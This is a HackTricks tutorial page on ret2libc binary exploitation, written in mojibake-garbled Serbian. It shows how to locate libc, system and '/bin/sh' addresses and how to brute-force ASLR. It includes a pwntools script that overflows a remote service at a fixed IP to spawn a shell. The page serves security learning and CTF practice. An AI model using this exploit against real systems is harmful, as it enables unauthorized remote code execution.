# Ret2lib

{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
UÄite i veÅ¾bajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¾ite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## **Osnovne informacije**

SuÅ¡tina **Ret2Libc** je preusmeravanje toka izvrÅ¡avanja ranjivog programa na funkciju unutar deljene biblioteke (npr., **system**, **execve**, **strcpy**) umesto izvrÅ¡avanja shellcode-a koji je dostavio napadaÄ na steku. NapadaÄ kreira payload koji menja adresu povratka na steku da pokazuje na Å¾eljenu funkciju biblioteke, dok takoÄ‘e obezbeÄ‘uje da su svi potrebni argumenti ispravno postavljeni prema konvenciji pozivanja.

### **Primer koraka (pojednostavljeno)**

* Dobiti adresu funkcije koju treba pozvati (npr. system) i komandu koju treba pozvati (npr. /bin/sh)
* Generisati ROP lanac da prosledi prvi argument koji pokazuje na string komande i tok izvrÅ¡avanja funkciji

## PronalaÅ¾enje adresa

* PretpostavljajuÄ‡i da je `libc` koji se koristi onaj sa trenutnog raÄunara, moÅ¾ete pronaÄ‡i gde Ä‡e biti uÄitan u memoriji sa: 

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

ĞĞºĞ¾ Ğ¶ĞµĞ»Ğ¸Ñ‚Ğµ Ğ´Ğ° Ğ¿Ñ€Ğ¾Ğ²ĞµÑ€Ğ¸Ñ‚Ğµ Ğ´Ğ° Ğ»Ğ¸ ASLR Ğ¼ĞµÑšĞ° Ğ°Ğ´Ñ€ĞµÑÑƒ libc, Ğ¼Ğ¾Ğ¶ĞµÑ‚Ğµ ÑƒÑ€Ğ°Ğ´Ğ¸Ñ‚Ğ¸:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* Poznavanjem koriÅ¡Ä‡ene libc, takoÄ‘e je moguÄ‡e pronaÄ‡i offset do `system` funkcije sa:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* Poznavanjem koriÅ¡Ä‡ene libc, takoÄ‘e je moguÄ‡e pronaÄ‡i offset do stringa `/bin/sh` funkcije sa:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### KoristeÄ‡i gdb-peda / GEF

PoznavajuÄ‡i koriÅ¡Ä‡eni libc, takoÄ‘e je moguÄ‡e koristiti Peda ili GEF da dobijete adresu funkcije **system**, funkcije **exit** i stringa **`/bin/sh`** :
```bash
p system
p exit
find "/bin/sh"
```
### KoriÅ¡Ä‡enje /proc/\<PID>/maps

Ako proces kreira **decu** svaki put kada razgovarate s njim (mreÅ¾ni server), pokuÅ¡ajte da **proÄitate** tu datoteku (verovatno Ä‡e vam biti potrebna root privilegija).

Ovde moÅ¾ete pronaÄ‡i **taÄno gde je libc uÄitan** unutar procesa i **gde Ä‡e biti uÄitan** za svako dete procesa.

![](<../../../.gitbook/assets/image (853).png>)

U ovom sluÄaju, uÄitan je u **0xb75dc000** (Ovo Ä‡e biti osnovna adresa libc)

## Nepoznata libc

MoÅ¾e biti moguÄ‡e da **ne znate koju libc binarni fajl uÄitava** (jer se moÅ¾da nalazi na serveru kojem nemate pristup). U tom sluÄaju moÅ¾ete iskoristiti ranjivost da **procurite neke adrese i saznate koja libc** biblioteka se koristi:

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

I moÅ¾ete pronaÄ‡i pwntools Å¡ablon za ovo u:

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

### Poznavanje libc sa 2 ofseta

Proverite stranicu [https://libc.blukat.me/](https://libc.blukat.me/) i koristite **nekoliko adresa** funkcija unutar libc da biste saznali **korisniÄku verziju**.

## ObilaÅ¾enje ASLR na 32 bita

Ovi napadi brute-force su **samo korisni za 32bitne sisteme**.

* Ako je eksploatacija lokalna, moÅ¾ete pokuÅ¡ati da brute-force-ujete osnovnu adresu libc (korisno za 32bitne sisteme):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Ako napadate udaljeni server, moÅ¾ete pokuÅ¡ati da **brute-force-ujete adresu `libc` funkcije `usleep`**, prosledjujuÄ‡i kao argument 10 (na primer). Ako u nekom trenutku **serveru treba dodatnih 10s da odgovori**, pronaÅ¡li ste adresu ove funkcije.

## One Gadget

IzvrÅ¡ite shell jednostavno skakanjem na **jednu** specifiÄnu **adresu** u libc:

{% content-ref url="one-gadget.md" %}
[one-gadget.md](one-gadget.md)
{% endcontent-ref %}

## x86 Ret2lib Code Example

U ovom primeru ASLR brute-force je integrisan u kod, a ranjivi binarni fajl se nalazi na udaljenom serveru:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib Primerak Koda

Proverite primer sa:

{% content-ref url="../" %}
[..](../)
{% endcontent-ref %}

## ARM64 Ret2lib Primerak

U sluÄaju ARM64, ret instrukcija skaÄe na adresu na koju pokazuje x30 registar, a ne na adresu na koju pokazuje registar steka. Tako da je malo komplikovanije.

TakoÄ‘e, u ARM64, instrukcija radi ono Å¡to instrukcija radi (nije moguÄ‡e skoÄiti usred instrukcija i transformisati ih u nove).

Proverite primer sa:

{% content-ref url="ret2lib-+-printf-leak-arm64.md" %}
[ret2lib-+-printf-leak-arm64.md](ret2lib-+-printf-leak-arm64.md)
{% endcontent-ref %}

## Ret-into-printf (ili puts)

Ovo omoguÄ‡ava **curenje informacija iz procesa** pozivajuÄ‡i `printf`/`puts` sa nekim specifiÄnim podacima postavljenim kao argument. Na primer, stavljanje adrese `puts` u GOT prilikom izvrÅ¡avanja `puts` Ä‡e **curiti adresu `puts` u memoriji**.

## Ret2printf

Ovo u suÅ¡tini znaÄi zloupotrebu **Ret2lib da se transformiÅ¡e u ranjivost format stringova `printf`** koristeÄ‡i `ret2lib` da pozove printf sa vrednostima za eksploataciju (zvuÄi besmisleno, ali je moguÄ‡e):

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

## Ostali Primeri & reference

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)
* Ret2lib, uz curenje adrese funkcije u libc, koristeÄ‡i jedan gadget
* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 bita, ASLR omoguÄ‡eno, ali bez PIE, prvi korak je popuniti preliv do bajta 0x00 kanarija da bi se zatim pozvao puts i curio. Sa kanarijom se kreira ROP gadget za pozivanje puts da curi adresu puts iz GOT-a i ROP gadget za pozivanje `system('/bin/sh')`
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 bita, ASLR omoguÄ‡eno, bez kanarija, preliv steka u main iz podfunkcije. ROP gadget za pozivanje puts da curi adresu puts iz GOT-a i zatim poziva jedan gadget.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html)
* 64 bita, bez pie, bez kanarija, bez relro, nx. Koristi write funkciju da curi adresu write (libc) i poziva jedan gadget.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html)
* Koristi format string da curi kanariju iz steka i preliv bafera da pozove system (to je u GOT-u) sa adresom `/bin/sh`.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html)
* 32 bita, bez relro, bez kanarija, nx, pie. Zloupotreba loÅ¡eg indeksiranja da curi adrese libc i heap iz steka. Zloupotreba prelivanja bafera da uradi ret2lib pozivajuÄ‡i `system('/bin/sh')` (adresa heap-a je potrebna da bi se zaobiÅ¡la provera).

{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
UÄite i veÅ¾bajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¾ite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
